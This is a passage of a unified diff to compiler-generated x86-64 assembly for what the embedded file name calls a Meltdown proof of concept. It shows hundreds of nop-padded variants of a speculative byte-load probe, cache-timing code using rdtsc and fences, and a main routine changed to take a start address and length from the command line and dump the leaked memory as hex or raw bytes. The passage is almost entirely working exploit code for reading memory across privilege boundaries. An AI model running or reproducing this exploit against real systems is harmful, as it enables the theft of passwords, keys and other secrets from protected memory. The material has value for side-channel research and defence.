 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 432
 .Lprobe_one_win0_var432:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	nop
+	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 433
 .Lprobe_one_win0_var433:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 434
 .Lprobe_one_win0_var434:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 435
 .Lprobe_one_win0_var435:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 436
 .Lprobe_one_win0_var436:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 437
 .Lprobe_one_win0_var437:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
-	jz	92b
 	nop
+	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7678,13 +7678,13 @@ probe_one:
 .Lprobe_one_win0_var438:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -7695,12 +7695,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -7714,8 +7714,8 @@ probe_one:
 	nop
 	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7723,29 +7723,29 @@ probe_one:
 .Lprobe_one_win0_var441:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 442
 .Lprobe_one_win0_var442:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -7755,12 +7755,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -7768,59 +7768,59 @@ probe_one:
 .Lprobe_one_win0_var444:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 445
 .Lprobe_one_win0_var445:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 446
 .Lprobe_one_win0_var446:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 447
 .Lprobe_one_win0_var447:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
+	nop
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7828,14 +7828,14 @@ probe_one:
 .Lprobe_one_win0_var448:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
 	nop
+	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7843,13 +7843,13 @@ probe_one:
 .Lprobe_one_win0_var449:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -7858,16 +7858,16 @@ probe_one:
 .Lprobe_one_win0_var450:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	nop
 	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 451
 .Lprobe_one_win0_var451:
@@ -7875,8 +7875,8 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	jz	92b
@@ -7892,12 +7892,12 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 453
 .Lprobe_one_win0_var453:
@@ -7908,9 +7908,9 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -7919,13 +7919,13 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7933,14 +7933,14 @@ probe_one:
 .Lprobe_one_win0_var455:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7951,11 +7951,11 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -7963,30 +7963,30 @@ probe_one:
 .Lprobe_one_win0_var457:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 458
 .Lprobe_one_win0_var458:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 459
@@ -7994,11 +7994,11 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -8009,29 +8009,29 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 461
 .Lprobe_one_win0_var461:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 462
@@ -8044,9 +8044,9 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 463
@@ -8054,59 +8054,59 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 464
 .Lprobe_one_win0_var464:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 465
 .Lprobe_one_win0_var465:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 466
 .Lprobe_one_win0_var466:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 467
@@ -8115,44 +8115,44 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 468
 .Lprobe_one_win0_var468:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 469
 .Lprobe_one_win0_var469:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 470
 .Lprobe_one_win0_var470:
@@ -8160,12 +8160,12 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -8175,21 +8175,21 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 472
 .Lprobe_one_win0_var472:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
@@ -8203,14 +8203,14 @@ probe_one:
 .Lprobe_one_win0_var473:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -8218,58 +8218,58 @@ probe_one:
 .Lprobe_one_win0_var474:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 475
 .Lprobe_one_win0_var475:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 476
 .Lprobe_one_win0_var476:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 477
 .Lprobe_one_win0_var477:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	nop
 	nop
@@ -8278,46 +8278,46 @@ probe_one:
 .Lprobe_one_win0_var478:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 479
 .Lprobe_one_win0_var479:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 480
 .Lprobe_one_win0_var480:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 481
 .Lprobe_one_win0_var481:
@@ -8326,26 +8326,26 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 482
 .Lprobe_one_win0_var482:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -8353,13 +8353,13 @@ probe_one:
 .Lprobe_one_win0_var483:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -8370,12 +8370,12 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -8383,13 +8383,13 @@ probe_one:
 .Lprobe_one_win0_var485:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -8398,15 +8398,15 @@ probe_one:
 .Lprobe_one_win0_var486:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 487
@@ -8415,14 +8415,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 488
 .Lprobe_one_win0_var488:
@@ -8431,8 +8431,8 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	nop
 	jz	92b
@@ -8443,16 +8443,16 @@ probe_one:
 .Lprobe_one_win0_var489:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 490
 .Lprobe_one_win0_var490:
@@ -8461,28 +8461,28 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 491
 .Lprobe_one_win0_var491:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 492
 .Lprobe_one_win0_var492:
@@ -8490,59 +8490,59 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 493
 .Lprobe_one_win0_var493:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 494
 .Lprobe_one_win0_var494:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 495
 .Lprobe_one_win0_var495:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 496
 .Lprobe_one_win0_var496:
@@ -8551,13 +8551,13 @@ probe_one:
 	nop
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 497
 .Lprobe_one_win0_var497:
@@ -8568,11 +8568,11 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 498
 .Lprobe_one_win0_var498:
@@ -8580,14 +8580,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	nop
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 499
 .Lprobe_one_win0_var499:
@@ -8600,9 +8600,9 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 .Lprobe_one_win0_continue:
 __speculative_byte_load_exit:
@@ -8621,7 +8621,7 @@ __speculative_byte_load_exit:
 	movq	-2344(%rbp), %rax
 	movq	%rax, %rcx
 #APP
-# 120 "meltdownFrichetten.c" 1
+# 118 "meltdownNew.c" 1
 	mfence
 	lfence
 	rdtsc
@@ -8863,13 +8863,14 @@ dump_hex:
 .LFE13:
 	.size	dump_hex, .-dump_hex
 	.section	.rodata
+	.align 8
 .LC4:
+	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
+.LC5:
 	.string	"mmap() failed: %s\n"
 	.align 8
-.LC5:
-	.string	"poke buffer: %p, page size: %i\n"
 .LC6:
-	.string	"Start address: 0x%016lx \n"
+	.string	"poke buffer: %p, page size: %i\n"
 	.text
 	.globl	main
 	.type	main, @function
@@ -8891,8 +8892,8 @@ main:
 	movq	%rax, -24(%rbp)
 	xorl	%eax, %eax
 	call	getpagesize@PLT
-	movl	%eax, -248(%rbp)
-	movl	$0, -244(%rbp)
+	movl	%eax, -244(%rbp)
+	movl	$0, -248(%rbp)
 	movq	$0, -232(%rbp)
 	movq	$0, -224(%rbp)
 	leaq	-208(%rbp), %rax
@@ -8912,13 +8913,42 @@ main:
 	movq	%rax, %rsi
 	movl	$11, %edi
 	call	sigaction@PLT
-	movq	test.0(%rip), %rax
-	movq	%rax, -232(%rbp)
-	movq	test.0(%rip), %rax
+	cmpl	$2, -260(%rbp)
+	jle	.L33
+	cmpl	$4, -260(%rbp)
+	jle	.L34
+.L33:
+	movq	-272(%rbp), %rax
+	movq	(%rax), %rax
+	movq	%rax, %rsi
+	leaq	.LC4(%rip), %rax
 	movq	%rax, %rdi
-	call	strlen@PLT
+	movl	$0, %eax
+	call	printf@PLT
+	movl	$0, %eax
+	jmp	.L47
+.L34:
+	movq	-272(%rbp), %rax
+	addq	$8, %rax
+	movq	(%rax), %rax
+	movl	$16, %edx
+	movl	$0, %esi
+	movq	%rax, %rdi
+	call	strtoul@PLT
+	movq	%rax, -232(%rbp)
+	movq	-272(%rbp), %rax
+	addq	$16, %rax
+	movq	(%rax), %rax
+	movl	$10, %edx
+	movl	$0, %esi
+	movq	%rax, %rdi
+	call	strtoul@PLT
 	movq	%rax, -224(%rbp)
-	movl	-248(%rbp), %eax
+	cmpl	$4, -260(%rbp)
+	jne	.L36
+	movl	$1, -248(%rbp)
+.L36:
+	movl	-244(%rbp), %eax
 	sall	$8, %eax
 	cltq
 	movl	$0, %r9d
@@ -8930,43 +8960,37 @@ main:
 	call	mmap@PLT
 	movq	%rax, -216(%rbp)
 	cmpq	$-1, -216(%rbp)
-	jne	.L33
+	jne	.L37
 	call	__errno_location@PLT
 	movl	(%rax), %eax
 	movl	%eax, %edi
 	call	strerror@PLT
 	movq	%rax, %rsi
-	leaq	.LC4(%rip), %rax
-	movq	%rax, %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$-1, %eax
-	jmp	.L34
-.L33:
-	movl	-248(%rbp), %edx
-	movq	-216(%rbp), %rax
-	movq	%rax, %rsi
 	leaq	.LC5(%rip), %rax
 	movq	%rax, %rdi
 	movl	$0, %eax
 	call	printf@PLT
-	movq	-232(%rbp), %rax
+	movl	$-1, %eax
+	jmp	.L47
+.L37:
+	movl	-244(%rbp), %edx
+	movq	-216(%rbp), %rax
 	movq	%rax, %rsi
 	leaq	.LC6(%rip), %rax
 	movq	%rax, %rdi
 	movl	$0, %eax
 	call	printf@PLT
 	movq	$0, -240(%rbp)
-	jmp	.L35
-.L38:
-	cmpl	$0, -244(%rbp)
-	jne	.L36
+	jmp	.L38
+.L41:
+	cmpl	$0, -248(%rbp)
+	jne	.L39
 	cmpq	$0, -240(%rbp)
-	je	.L36
+	je	.L39
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	jne	.L36
+	jne	.L39
 	movq	-232(%rbp), %rdx
 	movq	-240(%rbp), %rax
 	addq	%rdx, %rax
@@ -8977,21 +9001,21 @@ main:
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	dump_hex
-.L36:
+.L39:
 	movq	-232(%rbp), %rdx
 	movq	-240(%rbp), %rax
 	leaq	(%rdx,%rax), %rcx
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rbx
-	movl	-248(%rbp), %edx
+	movl	-244(%rbp), %edx
 	movq	-216(%rbp), %rax
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	probe_one
 	movb	%al, -48(%rbp,%rbx)
-	cmpl	$0, -244(%rbp)
-	je	.L37
+	cmpl	$0, -248(%rbp)
+	je	.L40
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rdx
@@ -9001,39 +9025,39 @@ main:
 	movq	%rax, %rsi
 	movl	$1, %edi
 	call	write@PLT
-.L37:
+.L40:
 	addq	$1, -240(%rbp)
-.L35:
+.L38:
 	movq	-240(%rbp), %rax
 	cmpq	-224(%rbp), %rax
-	jb	.L38
-	cmpl	$0, -244(%rbp)
-	jne	.L39
+	jb	.L41
+	cmpl	$0, -248(%rbp)
+	jne	.L42
 	cmpq	$0, -240(%rbp)
-	je	.L39
+	je	.L42
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	je	.L40
+	je	.L43
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rdx
-	jmp	.L41
-.L40:
+	jmp	.L44
+.L43:
 	movl	$16, %edx
-.L41:
+.L44:
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	jne	.L42
+	jne	.L45
 	movq	-240(%rbp), %rax
 	subq	$1, %rax
 	andq	$-16, %rax
-	jmp	.L43
-.L42:
+	jmp	.L46
+.L45:
 	movq	-240(%rbp), %rax
 	andq	$-16, %rax
-.L43:
+.L46:
 	movq	-232(%rbp), %rcx
 	addq	%rcx, %rax
 	movq	%rax, %rcx
@@ -9041,8 +9065,8 @@ main:
 	movq	%rax, %rsi
